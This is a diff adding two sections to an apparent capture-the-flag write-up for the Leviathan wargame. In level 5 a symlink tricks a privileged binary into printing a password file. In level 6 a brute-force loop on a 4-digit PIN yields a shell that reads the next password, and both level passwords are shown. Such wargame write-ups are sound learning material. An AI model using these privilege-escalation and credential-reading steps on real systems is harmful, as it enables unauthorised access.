@@ -213,3 +213,48 @@ So looks like the binary returned is actully the key we just have to convert it 
 
 * * *
 
+## leviathan5
+
+
+```bash
+leviathan5@leviathan:~$ ls
+leviathan5
+leviathan5@leviathan:~$ ./leviathan5
+Cannot find /tmp/file.log
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@leviathan:~$ ./leviathan5
+UgaoFee4li
+leviathan5@leviathan:~$
+
+```
+
+Binary file was reading content of /tmp/file.log I just created a soft link of the flag file and named it file.log Simple right ?!
+
+
+* * * 
+
+## leviathan6
+
+Just have to bruteforce a 4 digit pin in this challenge
+
+```bash
+leviathan6@leviathan:~$ ls
+leviathan6
+leviathan6@leviathan:~$ ./leviathan6
+usage: ./leviathan6 <4 digit code>
+leviathan6@leviathan:~$ for key in $(seq 0 10000); do ./leviathan6 $key; done
+
+...
+Wrong
+Wrong
+Wrong
+Wrong
+$ whoami
+leviathan7
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+$
+
+```
+
+* * *
